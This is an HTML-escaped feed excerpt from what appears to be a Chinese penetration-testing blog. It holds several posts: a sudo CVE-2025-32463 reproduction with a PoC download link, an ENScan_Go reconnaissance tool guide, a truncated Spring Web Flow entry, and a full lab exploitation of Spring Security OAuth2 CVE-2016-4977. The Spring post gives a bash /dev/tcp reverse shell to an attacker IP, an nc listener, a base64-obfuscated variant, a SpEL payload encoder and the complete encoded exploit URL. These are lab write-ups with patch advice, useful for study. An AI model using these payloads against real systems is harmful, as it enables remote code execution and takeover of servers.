&lt;h1 id="0x04-环境搭建">0x04 环境搭建&lt;/h1>
&lt;p>作者已尝试在 ubuntu-22.04.5-desktop-amd64 以及 ubuntu-18.04.6-desktop-amd64 复现过，均以失败告终，最后在 kali-linux-2024.1-amd64 上复现成功，后面又测试了几个系统，确认 &lt;strong>Fedora 41 Server&lt;/strong> 以及 &lt;strong>Ubuntu 24.04-1&lt;/strong> 也可被攻击。&lt;/p>
&lt;ul>
&lt;li>去官网下载 sudo 是漏洞版本内的 Linux ISO，这里以 2024 年第一版的 Kali 为例子。&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://old.kali.org/kali-images/kali-2024.1/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>然后就是在 VMware 上配置 Kali 虚拟机了，这一系列过程就不赘述了。&lt;/li>
&lt;/ul>
&lt;h1 id="0x05-漏洞复现">0x05 漏洞复现&lt;/h1>
&lt;p>POC：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">通过网盘分享的文件：CVE-2025-32463_chwoot-main.zip
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">链接: https://pan.baidu.com/s/1Qkb8ohhQPdwNope5RxZ11w 提取码: ynwk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--来自百度网盘超级会员v4的分享
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251010154955.png" alt="image.png">&lt;/p>
&lt;h1 id="0x06-修复建议">0x06 修复建议&lt;/h1>
&lt;ul>
&lt;li>安全更新&lt;/li>
&lt;li>目前官方已发布安全更新，建议用户尽快升级至最新版本：sudo &amp;gt;= 1.9.17p1&lt;/li>
&lt;li>官方补丁&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">- https://www.sudo.ws/security/advisories/host_any/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- https://www.sudo.ws/security/advisories/chroot_bug
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>临时处置&lt;/li>
&lt;li>在环境中搜索任何使用了 Host 或 Host_Alias 选项的内容。检查 &lt;code>/etc/sudoers&lt;/code>中定义的所有 Sudo 规则以及 &lt;code>/etc/sudoers.d&lt;/code>下的文件。如果 Sudo 规则存储在 LDAP 中，请使用 ldapsearch 等工具转储这些规则。&lt;/li>
&lt;/ul>
&lt;h1 id="参考链接">参考链接&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://ubuntu.com/security/CVE-2025-32463
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://nvd.nist.gov/vuln/detail/CVE-2025-32463
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【资产收集】ENScan_Go-信息收集工具</title><link>http://localhost:1313/p/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86enscan_go-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</link><pubDate>Mon, 22 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86enscan_go-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</guid><description>&lt;img src="http://localhost:1313/images/82.webp" alt="Featured image of post 【资产收集】ENScan_Go-信息收集工具" />&lt;h1 id="0x00-项目地址">0x00 项目地址&lt;/h1>
&lt;p>项目为狼组团队的师傅开发，废话不多说，以下是项目地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/wgpsec/ENScan_GO
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250923121249.png" alt="image.png">&lt;/p>
&lt;p>我的是windows系统，直接下载这个即可。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250923121310.png" alt="image.png">&lt;br>
文件下载解压仅有exe文件&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250923121420.png" alt="image.png">&lt;/p>
&lt;h1 id="0x01-使用">0x01 使用&lt;/h1>
&lt;p>初次使用需要初始化&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">.\enscan-v1.3.1-windows-amd64.exe -v
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250923121505.png" alt="image.png">&lt;br>
生成&lt;code>config.yaml&lt;/code>配置文件&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250923121551.png" alt="image.png">&lt;br>
以爱企查为例导入cookie&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">链接：https://aiqicha.baidu.com/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">（注意：默认查询为aiqicha.baidu.com，请勿使用 aiqicha.com）
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这里最好使用抓包工具进行抓取：&lt;br>
爱企查的cookie&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250923122433.png" alt="">&lt;br>
天眼查的cookie&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250923122924.png" alt="image.png">&lt;br>
然后直接运行，即可！&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> .\enscan-v1.3.1-windows-amd64.exe -n &amp;#34;汉堡王（上海）餐饮有限公司&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250923124222.png" alt="image.png">&lt;/p></description></item><item><title>【Spring Boot】远程命令执行漏洞（CVE-2016-4977）</title><link>http://localhost:1313/p/spring-boot%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2016-4977/</link><pubDate>Mon, 08 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/spring-boot%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2016-4977/</guid><description>&lt;img src="http://localhost:1313/images/52.webp" alt="Featured image of post 【Spring Boot】远程命令执行漏洞（CVE-2016-4977）" />&lt;h1 id="spring-security-oauth2-远程命令执行漏洞cve-2016-4977">Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）&lt;/h1>
&lt;h1 id="漏洞描述">漏洞描述&lt;/h1>
&lt;p>Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。&lt;/p>
&lt;h1 id="影响范围">影响范围&lt;/h1>
&lt;p>&lt;strong>2.0.0-2.0.9&lt;/strong>&lt;br>
&lt;strong>1.0.0-1.0.5&lt;/strong>&lt;/p>
&lt;h1 id="复现过程">复现过程&lt;/h1>
&lt;p>这里使用2.0.8版本&lt;br>
使用vulhub&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">root@ubuntu:/mnt/vulhub# cd spring
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@ubuntu:/mnt/vulhub/spring# ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CVE-2016-4977 CVE-2017-4971 CVE-2017-8046 CVE-2018-1270 CVE-2018-1273 CVE-2022-22947 CVE-2022-22963 CVE-2022-22965 CVE-2022-22978
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@ubuntu:/mnt/vulhub/spring# cd CVE-2016-4977
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@ubuntu:/mnt/vulhub/spring/CVE-2016-4977#
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>运行靶场：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>直接打开靶场：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908101432.png" alt="image.png">&lt;br>
直接访问：&lt;br>
默认admin:admin&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/oauth/authorize?response_type=${2*3}&amp;amp;client_id=acme&amp;amp;scope=openid&amp;amp;redirect_uri=http://test
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908101614.png" alt="image.png">&lt;br>
下载POC，&lt;code>poc.py&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">#!/usr/bin/env python
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">message = input(&amp;#39;Enter message to encode:&amp;#39;)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">poc = &amp;#39;${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&amp;#39; % ord(message[0])
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">for ch in message[1:]:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> poc += &amp;#39;.concat(T(java.lang.Character).toString(%s))&amp;#39; % ord(ch)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">poc += &amp;#39;)}&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">print(poc)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>构造反弹shell命令（攻击机的IP地址）&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.197.129/4444 0&amp;gt;&amp;amp;1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nc -lvnp 4444
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>使用在线编码对命令进行编码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://forum.ywhack.com/shell.php
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908133144.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjkvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后使用POC，将命令再次编码：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908102826.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(53)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>构造终极POC&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/oauth/authorize?response_type=上面的那一长串POC&amp;amp;client_id=acme&amp;amp;scope=openid&amp;amp;redirect_uri=http://test
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>访问链接&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(53)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&amp;amp;client_id=acme&amp;amp;scope=openid&amp;amp;redirect_uri=http://test
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>访问链接后，可以看出，成功反弹shell。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250908133833.png" alt="image.png">&lt;/p>
&lt;h1 id="修复建议">修复建议&lt;/h1>
&lt;p>1. &lt;strong>使用1.0.x版本的用户应放弃在认证通过和错误这两个页面中使用Whitelabel视图&lt;/strong>&lt;br>
2. &lt;strong>使用2.0.x版本的用户升级到2.0.10以及更高的版本&lt;/strong>&lt;/p></description></item><item><title>【Spring Web】框架远程代码执行（CVE-2017-4971）</title><link>http://localhost:1313/p/spring-web%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Ccve-2017-4971/</link><pubDate>Mon, 08 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/spring-web%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Ccve-2017-4971/</guid><description>&lt;img src="http://localhost:1313/images/53.webp" alt="Featured image of post 【Spring Web】框架远程代码执行（CVE-2017-4971）" />&lt;h1 id="漏洞简介">漏洞简介&lt;/h1>
&lt;p>Spring Web Flow是Spring的一个子项目 ， 主要目 的是解决跨越多个请求的、 用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力。&lt;br>
在其 2.4.x版本中， 如果我们控制了数据绑定时的field， 将导致一个SpEL表达式注入漏洞，从而造成任意命令执行。&lt;/p>
&lt;h1 id="影响版本">影响版本&lt;/h1>
&lt;p>&lt;strong>Spring Web Flow 2.4.0 - 2.4.4&lt;/strong>&lt;/p>
&lt;h2 id="触发漏洞需要的两个条件">触发漏洞需要的两个条件&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
